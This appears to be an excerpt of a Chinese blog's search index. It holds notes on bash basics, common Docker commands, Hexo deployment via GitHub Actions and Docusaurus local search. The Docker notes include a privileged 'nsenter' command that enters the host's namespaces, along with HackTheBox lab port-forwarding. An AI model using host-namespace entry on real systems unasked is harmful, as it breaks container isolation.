title="while"></a>while</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">int=1</span><span class="line"><span class="hljs-keyword">while</span>(( <span class="hljs-variable">$int</span>&lt;=5 ))</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$int</span></span><span class="line">    <span class="hljs-built_in">let</span> <span class="hljs-string">&quot;int++&quot;</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;输入 1 到 4 之间的数字:&#x27;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你输入的数字为:&#x27;</span></span><span class="line"><span class="hljs-built_in">read</span> aNum</span><span class="line"><span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">    1)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 1&#x27;</span></span><span class="line">    ;;</span><span class="line">    2)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 2&#x27;</span></span><span class="line">    ;;</span><span class="line">    3)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 3&#x27;</span></span><span class="line">    ;;</span><span class="line">    4)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 4&#x27;</span></span><span class="line">    ;;</span><span class="line">    *)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你没有输入 1 到 4 之间的数字&#x27;</span></span><span class="line">    ;;</span><span class="line"><span class="hljs-keyword">esac</span></span></code></pre></div></div><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>break命令允许跳出所有循环（终止执行后面的所有循环）。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> :</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;输入 1 到 5 之间的数字:&quot;</span></span><span class="line">    <span class="hljs-built_in">read</span> aNum</span><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">        1|2|3|4|5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字为 <span class="hljs-variable">$aNum</span>!&quot;</span></span><span class="line">        ;;</span><span class="line">        *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span></span><span class="line">            <span class="hljs-built_in">break</span></span><span class="line">        ;;</span><span class="line">    <span class="hljs-keyword">esac</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><p>跳出当前循环。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> :</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;输入 1 到 5 之间的数字: &quot;</span></span><span class="line">    <span class="hljs-built_in">read</span> aNum</span><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">        1|2|3|4|5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字为 <span class="hljs-variable">$aNum</span>!&quot;</span></span><span class="line">        ;;</span><span class="line">        *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字不是 1 到 5 之间的!&quot;</span></span><span class="line">            <span class="hljs-built_in">continue</span></span><span class="line">            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;游戏结束&quot;</span></span><span class="line">        ;;</span><span class="line">    <span class="hljs-keyword">esac</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="until"><a href="#until" class="headerlink" title="until"></a>until</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"></br></span><span class="line">a=0</span><span class="line"></br></span><span class="line">until [ ! <span class="hljs-variable">$a</span> -lt 10 ]</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span></span><span class="line">   a=`expr <span class="hljs-variable">$a</span> + 1`</span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-title">funWithParam</span></span>()&#123;</span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个参数为 <span class="hljs-variable">$1</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第二个参数为 <span class="hljs-variable">$2</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第十个参数为 <span class="hljs-variable">$10</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第十个参数为 <span class="hljs-variable">$&#123;10&#125;</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第十一个参数为 <span class="hljs-variable">$&#123;11&#125;</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;参数总数有 <span class="hljs-variable">$#</span> 个!&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;作为一个字符串输出所有参数 $* !&quot;</span></span><span class="line">&#125;</span><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span></code></pre></div></div><p>结果： </p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-tap codeBlockLines"><span class="line">第一个参数为<span class="hljs-number"> 1 </span>!</span><span class="line">第二个参数为<span class="hljs-number"> 2 </span>!</span><span class="line">第十个参数为<span class="hljs-number"> 10 </span>!</span><span class="line">第十个参数为<span class="hljs-number"> 34 </span>!</span><span class="line">第十一个参数为<span class="hljs-number"> 73 </span>!</span><span class="line">参数总数有<span class="hljs-number"> 11 </span>个!</span><span class="line">作为一个字符串输出所有参数<span class="hljs-number"> 1 </span>2<span class="hljs-number"> 3 </span>4<span class="hljs-number"> 5 </span>6<span class="hljs-number"> 7 </span>8<span class="hljs-number"> 9 </span>34<span class="hljs-number"> 73 </span>!</span></code></pre></div></div><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">who &gt; today.log <span class="hljs-comment"># 执行结果覆盖到文件 today.log</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;菜鸟教程：www.runoob.com&quot;</span> &gt;&gt; today.log <span class="hljs-comment"># 执行结果追加到文件 today.log</span></span><span class="line">wc -l &lt; today.log <span class="hljs-comment"># 统计 today.log 行数</span></span><span class="line">wc -l &lt;&lt; <span class="hljs-string">EOF</span></span><span class="line"><span class="hljs-string">    李白</span></span><span class="line"><span class="hljs-string">    苏轼</span></span><span class="line"><span class="hljs-string">    王勃</span></span><span class="line"><span class="hljs-string">EOF</span></span></code></pre></div></div><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>test1.sh</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">name=<span class="hljs-string">&quot;Chris&quot;</span></span></code></pre></div></div><p>test2.sh</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-comment">#使用 . 号来引用test1.sh 文件</span></span><span class="line">. ./test1.sh</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 或者使用以下包含文件代码</span></span><span class="line"><span class="hljs-comment"># source ./test1.sh</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$name</span></span></code></pre></div></div><blockquote><p>注：被包含的文件 test1.sh 不需要可执行权限。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 技术</title>
      <link href="/2021/07/06/docker/"/>
      <url>/2021/07/06/docker/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-是什么"><a href="#Docker-是什么" class="headerlink" title="Docker 是什么"></a>Docker 是什么</h2><p>docker是可以以极低资源运行的一个独立于文件系统的一个空间</p><h3 id="几个基本概念"><a href="#几个基本概念" class="headerlink" title="几个基本概念"></a>几个基本概念</h3><ul><li><code>image</code>  镜像， 类似于类的概念</li><li><code>container</code> 容器， 类似于实例的概念</li></ul><h3 id="docker-在windows下的使用"><a href="#docker-在windows下的使用" class="headerlink" title="docker 在windows下的使用"></a>docker 在windows下的使用</h3><p>docker一般是Linux系统下的工具，但是当windows出了个WSL后，docker就以一个WSL在windows下运行了。</p><p>每一个WSL在windows中都是独立的<code>vhdx</code>文件</p><p>可以通过<code>wsl -l -v</code> 查看docker文件， 通过<code>wsl -d docker-desktop</code>进入</p><h4 id="windows下的配置"><a href="#windows下的配置" class="headerlink" title="windows下的配置"></a>windows下的配置</h4><h5 id="修改存储位置"><a href="#修改存储位置" class="headerlink" title="修改存储位置"></a>修改存储位置</h5><ul><li><a href="https://blog.csdn.net/austindev/article/details/110387609">参考</a>这篇文章</li></ul><p>原理是将docker<code>export</code>出来后，<code>import</code>到新的地方</p><p>我保存的地方是<code>D:\Subsystem\docker-desktop-data</code></p><h5 id="关于image到底存在哪里"><a href="#关于image到底存在哪里" class="headerlink" title="关于image到底存在哪里"></a>关于image到底存在哪里</h5><ul><li><a href="https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/">这篇文章</a>讲述了image存放的问题。</li></ul><p>windows是按照虚拟机的方式存储，而要进入这个虚拟机是通过各个images，命令如下：</p><p><code>docker run -it --privileged --pid=host &lt;image&gt; nsenter -t 1 -m -u -i bash</code></p><p>而每个image其实是通过底下一层image叠加上来的，所以可以找到<code>/var/lib/docker/overlay2</code>中每一层叠加的内容</p><h2 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><ul><li><a href="https://www.runoob.com/docker/docker-command-manual.html">这里</a>是常用命令大全</li></ul><h3 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h3><p>在获取镜像前，可以通过<code>docker search</code> 来镜像查找相关内容。但是有的是需要特定版本的，这个需要先在<a href="https://hub.docker.com/">hub.docker.com</a>上确认版本。</p><ul><li><code>docker pull &lt;镜像&gt;:&lt;版本&gt;</code></li></ul><h3 id="创建自己的镜像"><a href="#创建自己的镜像" class="headerlink" title="创建自己的镜像"></a>创建自己的镜像</h3><p>方法是使用<code>Dockerfile</code>，在里面写好后使用</p><p><code>docker build -t &lt;image_name&gt; .</code> 创建</p><h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><ul><li><code>docker ps</code> 查看运行中的容器</li><li><code>docker ps -a</code> 查看所有容器</li><li><code>docker images</code> 查看存在的镜像</li></ul><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>以<code>docker run</code>开头</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>--name &lt;alias&gt;</code></td><td align="center">容器别名</td></tr><tr><td align="center"><code>-v &lt;主机文件&gt;:&lt;容器文件&gt;</code></td><td align="center">挂载如果没有文件会自动创建</td></tr><tr><td align="center"><code>-it</code></td><td align="center">交互界面</td></tr><tr><td align="center"><code>-d</code></td><td align="center">后台运行</td></tr><tr><td align="center"><code>-p &lt;主机端口&gt;:&lt;容器端口&gt;</code></td><td align="center">将主机的端口映射到容器的端口中</td></tr><tr><td align="center"><code>-e &lt;环境变量=Value&gt;</code></td><td align="center">设置环境变量</td></tr></tbody></table><p>例子：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run --name  myphp-fpm -v ~/nginx/www:/www  -d php:5.6-fpm</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run --name apache -v <span class="hljs-variable">$PWD</span>:/usr/<span class="hljs-built_in">local</span>/apache2/htdocs -p 8088:80  -it httpd /bin/bash</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run -it httpd /bin/bash</span></code></pre></div></div><p>像<code>php</code>这样的可能会立马就退出了，所以需要打开一个Shell来保活。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run -itd php bash</span></code></pre></div></div><h3 id="容器执行命令"><a href="#容器执行命令" class="headerlink" title="容器执行命令"></a>容器执行命令</h3><p>以<code>docker exec</code> 开头</p><ul><li><code>-it</code> 交互</li></ul><p>例子：</p><ul><li><code>docker exec apache ls /usr/local/apache2/htdocs</code></li><li><code>docker exec -it apache /bin/bash</code></li></ul><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>当创建了容器后会一直保留，所以需要删除</p><ul><li><p>删除所有退出的容器</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker rm -v `docker ps -aq -f status=exited`</span></code></pre></div></div></li><li><p>删除镜像</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker rmi &lt;image ID&gt;</span></code></pre></div></div></li></ul><p>docker 提供了更为简单的方法</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-gauss codeBlockLines"><span class="line">docker <span class="hljs-keyword">system</span> prune <span class="hljs-meta">#将对没有用的容器的网络进行删除</span></span><span class="line">docker container prune <span class="hljs-meta"># 删除所有退出状态的容器</span></span><span class="line">docker <span class="hljs-built_in">volume</span> prune <span class="hljs-meta"># 删除未被使用的数据卷</span></span><span class="line">docker image prune <span class="hljs-meta"># 删除 dangling 或所有未被使用的镜像</span></span></code></pre></div></div><ul><li><a href="https://www.cnblogs.com/sparkdev/p/9177283.html">参考文章</a></li></ul><h3 id="Commit容器"><a href="#Commit容器" class="headerlink" title="Commit容器"></a>Commit容器</h3><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li><code>Ctrl + P + Q</code> 退出并后台运行</li></ul><h2 id="Docker-容器间的通讯"><a href="#Docker-容器间的通讯" class="headerlink" title="Docker 容器间的通讯"></a>Docker 容器间的通讯</h2><ul><li><a href="https://my.oschina.net/thinwonton/blog/2993309">这里</a>是参考文章</li></ul><p>原理是docker内置了Bridge网桥组件，各个容器会分配IP地址，但是只有自定义的Bridge网络才能互相通讯</p><ul><li><p>创建自定义Bridge网络</p><ul><li><code>docker network create --driver bridge busybox_bridge</code></li></ul></li><li><p>将容器绑定到自定义Bridge网络中</p><ul><li><code>docker run -itd --network busybox_bridge --name busybox5 busybox</code></li></ul></li></ul><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p><code>docker-compose</code>是可以将多个镜像通过一套制定的规则统一运行起来的工具。极大的方便了每次启动docker需要麻烦配置的动作。</p><p>使用<code>YAML</code>文件配置</p><p><a href="https://cch20094.medium.com/docker-compose%E6%9E%B6%E8%A8%ADphp-mysql-apache-710321374758">这篇</a>介绍了如何使用<code>docker-compose</code>来搭建<code>PHP + Apache + MySql</code>的环境</p><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><h3 id="Docker-容器的端口修改"><a href="#Docker-容器的端口修改" class="headerlink" title="Docker 容器的端口修改"></a>Docker 容器的端口修改</h3><ol><li><p>关闭容器 <code>docker stop &lt;container&gt;</code></p></li><li><p>进入镜像的存储地方</p><ul><li><code>docker run -it --privileged --pid=host &lt;image&gt; nsenter -t 1 -m -u -i bash</code></li></ul></li><li><p>找到存储的容器点</p><ul><li><code>cd /var/lib/docker/containers/&lt;contian ID&gt;</code></li></ul></li><li><p>修改hostconfig.json 和 config.v2.json</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vala codeBlockLines"><span class="line"><span class="hljs-meta"># vim hostconfig.json</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;PortBindings&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:[&#123;<span class="hljs-string">&quot;HostIp&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;HostPort&quot;</span>:<span class="hljs-string">&quot;5711&quot;</span>&#125;]&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-meta">#vim config.v2.json</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;ExposedPorts&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:&#123;&#125;&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;Ports&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:[&#123;<span class="hljs-string">&quot;HostIp&quot;</span>:<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-string">&quot;HostPort&quot;</span>:<span class="hljs-string">&quot;5711&quot;</span>&#125;]&#125;</span></code></pre></div></div><ol start="5"><li>重启服务 <code>systemctl restart docker</code></li></ol><h3 id="docker-连接-hackthebox"><a href="#docker-连接-hackthebox" class="headerlink" title="docker 连接 hackthebox"></a>docker 连接 hackthebox</h3><p>问题1：<br>/dev/net/tun: not the file</p><ul><li><a href="https://stackoverflow.com/questions/30547484/calling-openconnect-vpn-client-in-docker-container-shows-tunsetiff-failed-opera">解决连接</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-applescript codeBlockLines"><span class="line">docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> <span class="hljs-comment">--privileged mykali /bin/bash</span></span></code></pre></div></div><p>加入所有权限，或者只加入一个能力<code>--cap-add SYS_NET_ADMIN --device /dev/net/tun </code></p><p>问题2：<br><code> Linux can&#39;t add IPv6 to interface tun0</code></p><p>没有开启ipv6</p><ul><li><code>--sysctl net.ipv6.conf.all.disable_ipv6=0</code></li></ul><h3 id="Docker-kali-connect-to-hackthebox"><a href="#Docker-kali-connect-to-hackthebox" class="headerlink" title="Docker kali connect to hackthebox"></a>Docker kali connect to hackthebox</h3><ul><li><a href="https://amar-laksh.github.io/2019/08/24/Setting-up-Kali-docker-for-HackTheBox.html">参考链接</a></li></ul><p>端口转发</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">socat</span> TCP<span class="hljs-number">4</span>-LISTEN:<span class="hljs-number">1633</span>,reuseaddr,fork TCP<span class="hljs-number">4</span>:<span class="hljs-number">10.10.10.28:80</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo 部署</title>
      <link href="/2021/07/05/hexo-%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/07/05/hexo-%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><a href="https://hexo.io/zh-cn/docs/">hexo 的文档</a></li></ul><p><code>hexo</code>基于<code>Node.js</code>开发，安装简单</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cmake codeBlockLines"><span class="line">npm <span class="hljs-keyword">install</span> hexo -g</span></code></pre></div></div><blockquote><p>如果要部署的话，<code>npm install</code>就可以了，因为<code>node_module</code>中已经包含了<code>hexo</code></p></blockquote><h2 id="安装3-hexo主题"><a href="#安装3-hexo主题" class="headerlink" title="安装3-hexo主题"></a>安装3-hexo主题</h2><ul><li><a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo 的文档</a></li></ul><h2 id="hexo-的基本使用"><a href="#hexo-的基本使用" class="headerlink" title="hexo 的基本使用"></a>hexo 的基本使用</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-gauss codeBlockLines"><span class="line">hexo <span class="hljs-keyword">new</span> [<span class="hljs-built_in">title</span>]   <span class="hljs-meta"># 按照模板创建新的post文章</span></span><span class="line">hexo <span class="hljs-keyword">new</span> draft [<span class="hljs-built_in">title</span>]  <span class="hljs-meta"># 创建一个草稿</span></span><span class="line">hexo generate      <span class="hljs-meta"># 静态编译</span></span><span class="line">hexo list post     <span class="hljs-meta"># 查看已发布的文章</span></span><span class="line">hexo publish draft &lt;filename&gt;      <span class="hljs-meta"># 将草稿draft 转到 post</span></span><span class="line">hexo server --draft   <span class="hljs-meta"># 将草稿也渲染出来</span></span></code></pre></div></div><h2 id="在Github上部署"><a href="#在Github上部署" class="headerlink" title="在Github上部署"></a>在Github上部署</h2><p>我使用的方式为Action部署到<code>gh-page</code>分支上</p><p><code>.github/workflows/hexo.yml</code> 文件</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">Github</span> <span class="hljs-string">pages</span></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">build-and-deploy:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">persist-credentials:</span> <span class="hljs-literal">false</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">and</span> <span class="hljs-string">Build</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        npm install</span></span><span class="line"><span class="hljs-string">        node_modules/hexo/bin/hexo generate</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@releases/v3</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">ACCESS_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.ACCESS_TOKEN</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">        <span class="hljs-attr">BRANCH:</span> <span class="hljs-string">gh-pages</span></span><span class="line">        <span class="hljs-attr">FOLDER:</span> <span class="hljs-string">public</span></span><span class="line">        <span class="hljs-attr">BUILD_SCRIPT:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">node_modules/hexo/bin/hexo</span> <span class="hljs-string">generate</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus 实现搜索功能</title>
      <link href="/2021/06/28/docu%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/"/>
      <url>/2021/06/28/docu%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<p>Docusaurus 官方给出了一个添加搜索的方式<a href="https://docusaurus.io/zh-CN/docs/search"> Algolia DocSearch</a>，但是这个搜索插件需要得到Algolia官方的认证，如果你的网站还处于建设阶段，那么就不会被允许使用。</p><p>在网上搜索后发现了<a href="https://github.com/cmfcmf/docusaurus-search-local">search-local</a>的插件，这个插件为本地离线搜索。</p><ul><li><a href="https://docusaurus.io/feedback/p/offline-search">这里</a>是关于离线搜索的讨论</li></ul><h2 id="docusaurus-lunr-search-使用方法"><a href="#docusaurus-lunr-search-使用方法" class="headerlink" title="docusaurus-lunr-search 使用方法"></a>docusaurus-lunr-search 使用方法</h2><h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">yarn <span class="hljs-keyword">add</span> <span class="hljs-variable">@cmfcmf</span><span class="hljs-operator">/</span>docusaurus<span class="hljs-operator">-</span><span class="hljs-keyword">search</span><span class="hljs-operator">-</span><span class="hljs-keyword">local</span></span></code></pre></div></div><p>注意，在官方文档中是不支持中文搜索的。在查看源码后发现，这个插件使用的是<a href="https://github.com/MihaiValentin/lunr-languages">lunr-language</a>来进行分词的，<br>在最新版本中已经包含了中文分词，并且依赖<a href="https://www.npmjs.com/package/nodejieba">nodejieba</a>。</p><p>所以要再安装<code>nodejieba</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">yarn nodejieba</span></span></code></pre></div></div><blockquote><p><code>nodejieba</code>的安装依赖python，并且python的安装目录不能有中文<br>如果python已经安装到了中文目录，那么<code>npm install nodejieba</code>是可以安装的，然后<code>yarn install</code>。<br>千万别直接<code>yarn</code>。这将会导致代码框中的copy无法使用。</p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-coffeescript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.<span class="hljs-built_in">exports</span> = &#123;</span><span class="line">  plugins: [</span><span class="line">    [</span><span class="line">      <span class="hljs-built_in">require</span>.resolve(<span class="hljs-string">&#x27;@cmfcmf/docusaurus-search-local&#x27;</span>),</span><span class="line">      &#123;</span><span class="line">        indexDocs: <span class="hljs-literal">true</span>,</span><span class="line">        indexBlog: <span class="hljs-literal">true</span>,</span><span class="line">        docsRouteBasePath: <span class="hljs-string">&#x27;/doc&#x27;</span>,</span><span class="line">        blogRouteBasePath: <span class="hljs-string">&#x27;/blog&#x27;</span>,</span><span class="line">        language: [<span class="hljs-string">&#x27;en&#x27;</span>, <span class="hljs-string">&#x27;zh&#x27;</span>],</span><span class="line">      &#125;</span><span class="line">    ],</span><span class="line">  ],</span><span class="line">&#125;</span></code></pre></div></div><p>最后编译 <code>npm run build</code> 即可。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这个插件只能在静态页面中生效，也就是部署了之后才能看到</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">yarn build</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus 报错清单</title>
      <link href="/2021/06/28/docu%E6%8A%A5%E9%94%99%E6%B8%85%E5%8D%95/"/>
      <url>/2021/06/28/docu%E6%8A%A5%E9%94%99%E6%B8%85%E5%8D%95/</url>
      
